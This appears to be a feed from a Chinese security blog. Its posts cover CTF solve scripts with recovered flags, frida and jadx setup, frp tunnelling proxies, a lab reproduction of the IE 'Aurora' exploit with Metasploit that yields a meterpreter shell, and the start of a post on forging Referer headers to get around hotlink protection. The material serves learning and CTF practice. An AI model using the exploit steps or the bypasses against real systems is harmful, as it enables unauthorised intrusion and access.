v83 + <span class="number">85</span> * v82 + <span class="number">27</span> * v81 + <span class="number">42</span> * v84 + <span class="number">72</span> * v87)</span><br><span class="line">s.add(v45 == <span class="number">26</span> * v86 + <span class="number">67</span> * v84 + <span class="number">6</span> * v82 + <span class="number">4</span> * v81 + <span class="number">3</span> * v83 + <span class="number">68</span> * v87)</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">result = s.model()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>得到乱序的字符，按顺序输出就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/8/20</span></span><br><span class="line"><span class="comment"># @FileName  :77.py</span></span><br><span class="line">v84 = <span class="number">54</span></span><br><span class="line">v65 = <span class="number">52</span></span><br><span class="line">v63 = <span class="number">57</span></span><br><span class="line">v74 = <span class="number">45</span></span><br><span class="line">v47 = <span class="number">108</span></span><br><span class="line">v62 = <span class="number">98</span></span><br><span class="line">v81 = <span class="number">97</span></span><br><span class="line">v64 = <span class="number">45</span></span><br><span class="line">v48 = <span class="number">97</span></span><br><span class="line">v51 = <span class="number">55</span></span><br><span class="line">v58 = <span class="number">51</span></span><br><span class="line">v53 = <span class="number">49</span></span><br><span class="line">v49 = <span class="number">103</span></span><br><span class="line">v55 = <span class="number">49</span></span><br><span class="line">v57 = <span class="number">52</span></span><br><span class="line">v67 = <span class="number">49</span></span><br><span class="line">v54 = <span class="number">55</span></span><br><span class="line">v70 = <span class="number">57</span></span><br><span class="line">v69 = <span class="number">45</span></span><br><span class="line">v56 = <span class="number">100</span></span><br><span class="line">v86 = <span class="number">56</span></span><br><span class="line">v72 = <span class="number">48</span></span><br><span class="line">v60 = <span class="number">54</span></span><br><span class="line">v78 = <span class="number">52</span></span><br><span class="line">v68 = <span class="number">56</span></span><br><span class="line">v79 = <span class="number">99</span></span><br><span class="line">v75 = <span class="number">54</span></span><br><span class="line">v46 = <span class="number">102</span></span><br><span class="line">v77 = <span class="number">49</span></span><br><span class="line">v76 = <span class="number">101</span></span><br><span class="line">v50 = <span class="number">123</span></span><br><span class="line">v61 = <span class="number">51</span></span><br><span class="line">v71 = <span class="number">57</span></span><br><span class="line">v82 = <span class="number">102</span></span><br><span class="line">v83 = <span class="number">101</span></span><br><span class="line">v85 = <span class="number">52</span></span><br><span class="line">v87 = <span class="number">125</span></span><br><span class="line">v80 = <span class="number">50</span></span><br><span class="line">v73 = <span class="number">101</span></span><br><span class="line">v66 = <span class="number">101</span></span><br><span class="line">v59 = <span class="number">45</span></span><br><span class="line">v52 = <span class="number">101</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(v46)+<span class="built_in">chr</span>(v47)+<span class="built_in">chr</span>(v48)+<span class="built_in">chr</span>(v49)+<span class="built_in">chr</span>(v50)+<span class="built_in">chr</span>(v51)+<span class="built_in">chr</span>(v52)+<span class="built_in">chr</span>(v53)+</span><br><span class="line">      <span class="built_in">chr</span>(v54)+<span class="built_in">chr</span>(v55)+<span class="built_in">chr</span>(v56)+<span class="built_in">chr</span>(v57)+<span class="built_in">chr</span>(v58)+<span class="built_in">chr</span>(v59)+<span class="built_in">chr</span>(v60)+<span class="built_in">chr</span>(v61)</span><br><span class="line">+<span class="built_in">chr</span>(v62)+<span class="built_in">chr</span>(v63)+<span class="built_in">chr</span>(v64)+<span class="built_in">chr</span>(v65)+<span class="built_in">chr</span>(v66)+<span class="built_in">chr</span>(v67)+<span class="built_in">chr</span>(v68)+<span class="built_in">chr</span>(v69)+</span><br><span class="line">      <span class="built_in">chr</span>(v70) + <span class="built_in">chr</span>(v71)</span><br><span class="line">      + <span class="built_in">chr</span>(v72) + <span class="built_in">chr</span>(v73) + <span class="built_in">chr</span>(v74) + <span class="built_in">chr</span>(v75) + <span class="built_in">chr</span>(v76) + <span class="built_in">chr</span>(v77) + <span class="built_in">chr</span>(v78) + <span class="built_in">chr</span>(v79)</span><br><span class="line">      +<span class="built_in">chr</span>(v80)+<span class="built_in">chr</span>(v81)</span><br><span class="line">+<span class="built_in">chr</span>(v82)+<span class="built_in">chr</span>(v83)+<span class="built_in">chr</span>(v84)+<span class="built_in">chr</span>(v85)+<span class="built_in">chr</span>(v86)+<span class="built_in">chr</span>(v87))</span><br></pre></td></tr></table></figure>

<p>运行得到flag</p>
<p><img src="/posts/42820316/image-20200821102453812.png" alt="image-20200821102453812"></p>
<h2 id="diskdump"><a href="#diskdump" class="headerlink" title="diskdump"></a>diskdump</h2><p>使用<strong>binwalk -e disk_dump</strong>分离得到0.ext文件</p>
<p>可以继续分离，也可以挂载到文件系统</p>
<p><strong>mount 0.ext &#x2F;mnt</strong></p>
<p>进入目录 得到misc01文件夹，里面有三个文件</p>
<p><img src="/posts/42820316/clip_image001.png" alt="img"></p>
<p>分析demo 得到加密算法</p>
<p><img src="/posts/42820316/clip_image002.png" alt="img"></p>
<p>真实加密后的flag还是在diskdump中（ps：这里就比较脑洞了）</p>
<p>十六进制搜索加密后的特征<strong>44 2A 03</strong></p>
<p><img src="/posts/42820316/clip_image003.png" alt="img"></p>
<p> 图片打开提示flag已经被删除了，后来发现其实这里也可以使用**extundelete **恢复出flag.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install extundelete</span><br><span class="line">extundelete disk_dump --restore-all</span><br><span class="line"><span class="built_in">cd</span> RECOVERED_FILES/</span><br><span class="line"><span class="built_in">cd</span> misc01/</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure>

<p>编写脚本就可以得到flag，如下所示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_flag = [<span class="number">0x44</span>, <span class="number">0x2A</span>, <span class="number">0x03</span>, <span class="number">0xE5</span>, <span class="number">0x29</span>, <span class="number">0xBC</span>, <span class="number">0x96</span>, <span class="number">0x7F</span>, </span><br><span class="line"><span class="number">0x55</span>, <span class="number">0x35</span>, <span class="number">0x1B</span>, <span class="number">0xE1</span>, <span class="number">0xDD</span>, <span class="number">0xA4</span>, <span class="number">0x85</span>, <span class="number">0xA2</span>, <span class="number">0x1D</span>, </span><br><span class="line"><span class="number">0x0E</span>, <span class="number">0xEF</span>, <span class="number">0xD0</span>, <span class="number">0xA7</span>, <span class="number">0x6B</span>]</span><br><span class="line">real_flag = [<span class="number">0x44</span>, <span class="number">0x2A</span>, <span class="number">0x03</span>, <span class="number">0xE5</span>, <span class="number">0x29</span>, <span class="number">0xA3</span>, <span class="number">0xAF</span>, <span class="number">0x62</span>, <span class="number">0x05</span>, <span class="number">0x31</span>, <span class="number">0x4E</span>, <span class="number">0xF3</span>, </span><br><span class="line"><span class="number">0xD6</span>, <span class="number">0xEB</span>, <span class="number">0x90</span>, <span class="number">0x66</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xB7</span>, <span class="number">0x92</span>, <span class="number">0xF6</span>, <span class="number">0xD7</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, </span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0x41</span>, <span class="number">0xA3</span>, <span class="number">0x85</span>, <span class="number">0xEF</span>, <span class="number">0x90</span>, <span class="number">0x5A</span>, <span class="number">0x7E</span>, <span class="number">0x5B</span>, <span class="number">0xEC</span>, <span class="number">0xC1</span>, <span class="number">0xF0</span>, </span><br><span class="line"><span class="number">0xD4</span>, <span class="number">0x61</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x45</span>, <span class="number">0xEB</span>, <span class="number">0xB8</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">v4 = <span class="number">0x22</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag)):</span><br><span class="line">	ff = (v4 ^ real_flag[j]) - i</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(ff &amp; <span class="number">0xff</span>))</span><br><span class="line">	flag += <span class="built_in">chr</span>(ff &amp; <span class="number">0xff</span>)</span><br><span class="line">	v4 += <span class="number">0x22</span></span><br><span class="line">	i = (i + <span class="number">2</span>) &amp; <span class="number">0xF</span></span><br><span class="line">	<span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;e5d7c4ed-b8f6-4417-8317-b809fc26c047&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>frida使用小记</title>
    <url>/posts/a9684198.html</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote>
<p>It’s <a href="https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/">Greasemonkey</a> for native apps, or, put in more technical terms, it’s a dynamic code instrumentation toolkit. It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, GNU&#x2F;Linux, iOS, Android, and QNX. Frida also provides you with some simple tools built on top of the Frida API. These can be used as-is, tweaked to your needs, or serve as examples of how to use the API.———官网</p>
</blockquote>
<h3 id="服务端安装（Mac-os）"><a href="#服务端安装（Mac-os）" class="headerlink" title="服务端安装（Mac os）"></a>服务端安装（Mac os）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装python3</span></span><br><span class="line">brew install python</span><br><span class="line"><span class="comment"># 安装virtualenv 有的时候可能需要root权限  前面加sudo</span></span><br><span class="line">python3 -m pip install virtualenv</span><br><span class="line"><span class="comment"># 在~/Desktop/frida目录下创建虚拟环境</span></span><br><span class="line">virtualenv --python=python3 ~/Desktop/frida</span><br><span class="line"><span class="comment"># 切换到frida环境</span></span><br><span class="line"><span class="built_in">source</span> ~/Desktop/frida/bin/activite</span><br></pre></td></tr></table></figure>

<p>到这时还未装frida</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装frida</span></span><br><span class="line">pip install frida</span><br><span class="line"><span class="comment"># 安装相关工具</span></span><br><span class="line">pip install frida-tools</span><br><span class="line"><span class="comment">#安装可能需要几分钟时间...</span></span><br><span class="line"><span class="comment">#安装完成后会提示 successfully built frida</span></span><br><span class="line"><span class="comment">#查看版本信息</span></span><br><span class="line">frida --version</span><br></pre></td></tr></table></figure>

<p>在这时环境配置完成，用的时候只需要激活下就好</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/Desktop/frida/bin/activite</span><br></pre></td></tr></table></figure>

<h3 id="客户端安装（Android）"><a href="#客户端安装（Android）" class="headerlink" title="客户端安装（Android）"></a>客户端安装（Android）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数据线连接Android设备</span></span><br><span class="line"><span class="comment"># 开启开发者模式 USB调试(XiaoMi手机要关闭MIUI优化)</span></span><br><span class="line"><span class="comment"># adb devices查看有无此设备</span></span><br><span class="line"><span class="comment"># 新开启一个命令窗口</span></span><br><span class="line"><span class="comment"># 下载frida-server 解压 并推送到Android设备</span></span><br><span class="line"><span class="comment"># 地址：https://github.com/frida/frida/releases</span></span><br><span class="line">wget https://github.com/frida/frida/releases/download/12.9.4/frida-server-12.9.4-android-arm64.xz</span><br><span class="line"><span class="comment"># 解压 xz没有的话装一下</span></span><br><span class="line">xz -d frida-server-12.9.4-android-arm64.xz</span><br><span class="line"><span class="comment"># 推送</span></span><br><span class="line">adb push frida-server-12.9.4-android-arm64 /data/local/tmp</span><br></pre></td></tr></table></figure>

<h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入此设备命令行</span></span><br><span class="line">adb shell</span><br><span class="line"><span class="comment"># 获取root权限 手机端要授予权限(通过Magisk或者其他)</span></span><br><span class="line">su</span><br><span class="line"><span class="comment"># 切换路径</span></span><br><span class="line"><span class="built_in">cd</span> /data/local/tmp</span><br><span class="line"><span class="comment"># 为了方便 可以重命名</span></span><br><span class="line"><span class="built_in">mv</span> frida-server-12.9.4-android-arm64 frida-server</span><br><span class="line"><span class="comment"># 给执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x frida-server</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">./frida-server</span><br></pre></td></tr></table></figure>

<p>然后就可以编写js脚本或通过python脚本使用frida执行hook操作了</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>这个后续补充~~~</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="frida-API-自动补全"><a href="#frida-API-自动补全" class="headerlink" title="frida API 自动补全"></a>frida API 自动补全</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">wget https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/types/frida-gum/index.d.ts</span><br><span class="line"><span class="comment"># 移动</span></span><br><span class="line"><span class="built_in">mv</span> index.ts ~/Desktop/frida</span><br><span class="line"><span class="comment"># 使用时在js文件开头加入下面这行调用</span></span><br><span class="line">///&lt;reference path=<span class="string">&#x27;/Users/iqiqiya/Desktop/frida/frida-gum.d.ts&#x27;</span>/&gt;</span><br></pre></td></tr></table></figure>

<h4 id="服务端安装（Win10）"><a href="#服务端安装（Win10）" class="headerlink" title="服务端安装（Win10）"></a>服务端安装（Win10）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m pip install virtualenv -i https://pypi.douban.com/simple</span><br><span class="line"><span class="comment"># 注：python -m可不加 -i指定第三方库的下载源是豆瓣，https也可改为http</span></span><br><span class="line">virtualenv --python=python frida</span><br><span class="line"><span class="comment"># 切换目录后，指定创建frida文件夹及虚拟环境</span></span><br></pre></td></tr></table></figure>

<h5 id="报错："><a href="#报错：" class="headerlink" title="报错："></a>报错：</h5><p>FileNotFoundError: [Errno 2] No such file or directory: ‘c:\software\anaconda3\Lib\venv\scripts\nt\python.exe’</p>
<p>FileNotFoundError: [Errno 2] No such file or directory: ‘c:\software\anaconda3\Lib\venv\scripts\nt\pythonw.exe’</p>
<h5 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h5><p>复制安装路径下的python.exe及pythonw.exe到nt目录下即可</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/yi_nuo_wang/article/details/100268593">https://blog.csdn.net/yi_nuo_wang/article/details/100268593</a></p>
<h4 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h4><p><a href="https://blog.csdn.net/freakishfox/article/details/78302741">Frida官方手册 - 在Android上使用Frida</a></p>
<p><a href="https://www.freebuf.com/tag/frida">FreeBuf tags about frida</a></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>frida</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>docker-compose build加速构建</title>
    <url>/posts/a4848fd3.html</url>
    <content><![CDATA[<p>解决docker-compose up -d太慢的问题</p>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>



<h3 id="docker-compose-build快速构建"><a href="#docker-compose-build快速构建" class="headerlink" title="docker-compose build快速构建"></a>docker-compose build快速构建</h3><p>下载过慢</p>
<p><img src="/posts/a4848fd3/image-20201017171838774.png" alt="image-20201017171838774"></p>
<p>sed -i “s@<a href="http://deb.debian.org@https//mirrors.xxx.com@g&quot;">http://deb.debian.org@https://mirrors.xxx.com@g&quot;</a> &#x2F;etc&#x2F;apt&#x2F;sources.list</p>
<p>修改Dockerfile</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM debian:jessie</span><br><span class="line"></span><br><span class="line">MAINTAINER phithon &lt;root@leavesongs.com&gt;</span><br><span class="line"></span><br><span class="line">ADD https://gitee.com/iqiqiya/wait-for-it/raw/master/wait-for-it.sh /wait-for-it.sh</span><br><span class="line"></span><br><span class="line">RUN sed -i <span class="string">&quot;s@deb.debian.org@mirrors.aliyun.com@g&quot;</span> /etc/apt/sources.list &amp;&amp; sed -i <span class="string">&quot;s@security.debian.org@mirrors.aliyun.com@g&quot;</span> /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">set</span> -ex \ &amp;&amp; apt-get update \</span><br><span class="line">&amp;&amp; apt-get install curl -y --no-install-recommends \</span><br><span class="line">    &amp;&amp; <span class="built_in">chmod</span> +x /wait-for-it.sh \</span><br><span class="line">    &amp;&amp; &#123; \</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span>; \</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;/wait-for-it.sh $&#123;COUCHDB_URL&#125;&#x27;</span>; \</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;curl -X PUT http://$&#123;COUCHDB_AUTH&#125;@$&#123;COUCHDB_URL&#125;/_users&#x27;</span>; \</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;curl -X PUT http://$&#123;COUCHDB_AUTH&#125;@$&#123;COUCHDB_URL&#125;/_replicator&#x27;</span>; \</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;curl -X PUT http://$&#123;COUCHDB_AUTH&#125;@$&#123;COUCHDB_URL&#125;/_global_changes&#x27;</span>; \</span><br><span class="line">    &#125; | <span class="built_in">tee</span> /run.sh \</span><br><span class="line">    &amp;&amp; <span class="built_in">chmod</span> +x /run.sh \</span><br><span class="line">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span><br><span class="line"></span><br><span class="line">CMD [<span class="string">&quot;/run.sh&quot;</span>]</span><br></pre></td></tr></table></figure>



<p>遇到的错误</p>
<blockquote>
<p>sed: -e expression #1, char 37: unknown option to &#96;s’</p>
</blockquote>
<p>❌<a href="mailto:&#x73;&#x40;&#100;&#101;&#x62;&#x2e;&#x64;&#101;&#98;&#105;&#x61;&#x6e;&#46;&#111;&#x72;&#103;">&#x73;&#x40;&#100;&#101;&#x62;&#x2e;&#x64;&#101;&#98;&#105;&#x61;&#x6e;&#46;&#111;&#x72;&#103;</a>@mirrors.aliyun.com&#x2F;debian&#x2F;g</p>
<p>✅<a href="mailto:&#115;&#64;&#100;&#101;&#98;&#x2e;&#100;&#101;&#x62;&#x69;&#97;&#x6e;&#x2e;&#x6f;&#114;&#103;">&#115;&#64;&#100;&#101;&#98;&#x2e;&#100;&#101;&#x62;&#x69;&#97;&#x6e;&#x2e;&#x6f;&#114;&#103;</a>@mirrors.aliyun.com@g</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>frp实现内网穿透(通过设置http代理/Socks代理)</title>
    <url>/posts/f7240e5b.html</url>
    <content><![CDATA[<h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>1.需要通过公网服务器代理连接内网机器</p>
<p>2.需要通过代理使得本机外网地址变为该内网机器外网IP</p>
<span id="more"></span>

<h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><h4 id="1-下载并配置公网服务器端"><a href="#1-下载并配置公网服务器端" class="headerlink" title="1.下载并配置公网服务器端"></a>1.下载并配置公网服务器端</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先下载(根据服务器版本 示例：centos7 x64)</span></span><br><span class="line"><span class="comment"># 注：0.33是frp当前最新版本（客户端与服务器端要版本匹配）</span></span><br><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.33.0/frp_0.33.0_linux_amd64.tar.gz</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -zxvf frp_0.33.0_linux_amd64.tar.gz</span><br><span class="line"><span class="comment"># 切换路径</span></span><br><span class="line"><span class="built_in">cd</span> frp_0.33.0_linux_amd64</span><br><span class="line"><span class="comment"># 编辑配置 内容在下方</span></span><br><span class="line">vim frps.ini</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">./frps -c ./frps.ini </span><br></pre></td></tr></table></figure>

<p>frps.ini内容</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = test</span><br><span class="line"><span class="comment">#port，token自定义 保持客户端与服务端一致即可</span></span><br></pre></td></tr></table></figure>

<h4 id="2-下载并配置客户端"><a href="#2-下载并配置客户端" class="headerlink" title="2.下载并配置客户端"></a>2.下载并配置客户端</h4><p>这里的客户端是指想要代理的那台内网机器</p>
<p>下载地址：</p>
<p><a href="https://github.com/fatedier/frp/releases/download/v0.33.0/frp_0.33.0_windows_amd64.zip">https://github.com/fatedier/frp/releases/download/v0.33.0/frp_0.33.0_windows_amd64.zip</a></p>
<p>解压后编辑frpc.ini，配置http代理与socks5代理</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># 填写自己的服务器IP</span></span><br><span class="line"><span class="attr">server_addr</span> = xxx.xxx.xx.xxx</span><br><span class="line"><span class="comment"># port，token保持一致</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = test</span><br><span class="line"></span><br><span class="line"><span class="section">[plugin_http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7890</span></span><br><span class="line"><span class="attr">plugin</span> = http_proxy</span><br><span class="line"><span class="comment"># 可以添加认证</span></span><br><span class="line"><span class="comment"># plugin_http_user = abc</span></span><br><span class="line"><span class="comment"># plugin_http_passwd = abc</span></span><br><span class="line"></span><br><span class="line"><span class="section">[plugin_socks5]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7891</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="comment"># plugin_user = abc</span></span><br><span class="line"><span class="comment"># plugin_passwd = abc</span></span><br></pre></td></tr></table></figure>

<p>服务器要开放用到的端口，比如7000，7890，7891</p>
<p>宝塔面板用到的话也要放行下 登录–&gt;安全–&gt;输入端口–&gt;点击放行</p>
<p>最后运行客户端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br></pre></td></tr></table></figure>

<h4 id="3-代理使用"><a href="#3-代理使用" class="headerlink" title="3.代理使用"></a>3.代理使用</h4><p>只代理浏览器：推荐浏览器插件SwitchOmega</p>
<p>全局代理：win可以使用sstap  </p>
<p>​					linux&#x2F;mac可以使用Proxifier</p>
<p>终端代理：proxychain4</p>
<p>还有一些，欢迎补充~</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>frp</tag>
        <tag>内网穿透</tag>
        <tag>http代理</tag>
        <tag>socks5代理</tag>
      </tags>
  </entry>
  <entry>
    <title>jadx使用小记</title>
    <url>/posts/31c2da12.html</url>
    <content><![CDATA[<p>记录jadx下载及使用时出现的一些问题解决过程</p>
<span id="more"></span>

<h3 id="jadx下载"><a href="#jadx下载" class="headerlink" title="jadx下载"></a>jadx下载</h3><p><a href="https://github.com/skylot/jadx/releases/">https://github.com/skylot/jadx/releases/</a></p>
<p>选择对应版本进行下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/skylot/jadx/releases/download/v1.1.0/jadx-1.1.0.zip</span><br></pre></td></tr></table></figure>

<h3 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h3><h4 id="反编译卡死"><a href="#反编译卡死" class="headerlink" title="反编译卡死"></a>反编译卡死</h4><p>以windows版本为例，修改jadx-1.0.0\bin\jadx-gui.bat增加内存</p>
<p>第十七行<br><img src="/posts/31c2da12/360%E6%88%AA%E5%9B%BE-110848296.jpg" alt="360截图-110848296.jpg"></p>
<blockquote>
<p>set DEFAULT_JVM_OPTS&#x3D;”-Xms128M” “-Xmx4g”<br>修改为<br>set DEFAULT_JVM_OPTS&#x3D;”-Xms2048M” “-Xmx8g”</p>
</blockquote>
<h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4><p>-Xms jvm启动时分配的内存，比如-Xms128m，表示分配128M<br>-Xmx jvm运行过程中分配的最大内存，比如-Xmx4g，表示jvm进程最多只能够占用4g内存</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>jadx</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>ms10_002_aurora漏洞复现</title>
    <url>/posts/e5b1676e.html</url>
    <content><![CDATA[<h3 id="一、漏洞详情"><a href="#一、漏洞详情" class="headerlink" title="一、漏洞详情"></a>一、漏洞详情</h3><p>针对微软Internet Explorer浏览器“极光”内存损坏的攻击，当用户查看特制网页时允许远程执行代码。</p>
<span id="more"></span>

<h3 id="二、复现过程"><a href="#二、复现过程" class="headerlink" title="二、复现过程"></a>二、复现过程</h3><ul>
<li>环境：本机Mac OS、虚拟机win xp</li>
</ul>
<p>​			mac os需要安装msf（直接用kali也可以）</p>
<ul>
<li>步骤：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启msf</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 搜索对应模块</span></span><br><span class="line">search ms10_002_aurora</span><br><span class="line"><span class="comment"># 查看要设置的选项，可以指定ip监听</span></span><br><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e5b1676e/image-20200624175301385.png" alt="image-20200624175301385"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后台执行</span></span><br><span class="line">exploit -z</span><br><span class="line"><span class="comment"># 会生成一个url</span></span><br><span class="line">http://192.168.0.133:8080/Uk2B76Na8NV</span><br><span class="line"><span class="comment"># xp使用IE浏览E打开这个url，就可以获得一个session，指定session</span></span><br><span class="line">session -i 1</span><br><span class="line"><span class="comment"># 就可以获得meterpreter会话，也可以直接执行shell命令</span></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<h3 id="三、问题解决"><a href="#三、问题解决" class="headerlink" title="三、问题解决"></a>三、问题解决</h3><ul>
<li><p>Q：获得不了session无法建立会话</p>
</li>
<li><p>A：建议更换xp系统，推荐到itellyou下载</p>
</li>
<li><p>Q：meterpreter中文乱码怎么解决，如下图所示</p>
</li>
</ul>
<p><img src="/posts/e5b1676e/image-20200624184132967.png" alt="image-20200624184132967"></p>
<ul>
<li>A：输入chcp 65001即可切换编码为utf-8，操作如下图</li>
</ul>
<p><img src="/posts/e5b1676e/image-20200624184529470.png" alt="image-20200624184529470"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">注：CHCP是一个能够显示或设置活动代码页编号的CMD命令。</span><br><span class="line"></span><br><span class="line">代码页 描述</span><br><span class="line"></span><br><span class="line">65001 UTF-8代码页</span><br><span class="line"></span><br><span class="line">950 繁体中文</span><br><span class="line"></span><br><span class="line">936 简体中文默认的GBK</span><br><span class="line"></span><br><span class="line">437 MS-DOS美国英语</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>漏洞复现</category>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪造Referer访问防盗链图片</title>
    <url>/posts/324f26fd.html</url>
    <content><![CDATA[<p>绕过防盗链的姿势分享~</p>
<span id="more"></span>

<h2 id="基础防盗链"><a href="#基础防盗链" class="headerlink" title="基础防盗链"></a>基础防盗链</h2><p>基础防盗链主要是针对客户端请求过程中所携带的一些关键信息来验证请求的合法性， 比如客户端请求IP，请求URL中携带的referer。优点是规则简单，配置和使用都很方便，缺点是防盗链所依赖的验证信息很多都是可以伪造的，因此此类防盗链可靠性较低。</p>
<h2 id="Referer防盗链"><a href="#Referer防盗链" class="headerlink" title="Referer防盗链"></a>Referer防盗链</h2><p>Referer在HTTP协议里有特殊的用途，当浏览器向服务器发送请求时，一般会带上Referer头，告知服务器该请求是从哪个页面链接过来的。Referer经常被用于页面访问统计、图片防盗链等。</p>
<h3 id="适用场景举例："><a href="#适用场景举例：" class="headerlink" title="适用场景举例："></a>适用场景举例：</h3><p>比如：<a href="https://github.com/iqiqiya/iqiqiya-API/tree/master/58pic">千图库(58pic)无水印解析</a></p>
<blockquote>
<p>使用浏览器直接访问这张图片<a href="http://pic.qiantucdn.com/58pic/34/81/68/43g58PIC9ZK2GIjdy4Nff_PIC2018.jpg">http://pic.qiantucdn.com/58pic/34/81/68/43g58PIC9ZK2GIjdy4Nff_PIC2018.jpg</a><br>是访问不了的<br>回显报错 {“code”:”40310014”,”msg”:”invalid Referer header”}</p>
</blockquote>
